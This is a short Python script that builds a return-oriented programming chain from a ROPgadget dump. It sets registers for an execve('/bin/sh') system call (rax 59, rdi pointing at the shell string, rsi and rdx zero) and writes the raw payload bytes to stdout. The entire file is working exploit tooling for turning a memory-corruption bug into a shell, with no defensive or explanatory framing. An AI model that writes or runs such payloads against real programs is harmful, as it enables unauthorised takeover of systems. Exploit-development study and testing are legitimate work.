import argparse, sys, json
from rop_tool import load_ropgadget, GadgetStore, ROPChain

p = argparse.ArgumentParser()
p.add_argument("--gadgets", required=True)
p.add_argument("--syscall", default="execve")
p.add_argument("--binsh", type=lambda x: int(x, 0))
args = p.parse_args()

store = GadgetStore(load_ropgadget(args.gadgets))
rop = ROPChain(store)
rop.set_reg("rdi", args.binsh)
rop.set_reg("rsi", 0)
rop.set_reg("rdx", 0)
rop.set_reg("rax", 59)
rop.syscall()
sys.stdout.buffer.write(rop.build())
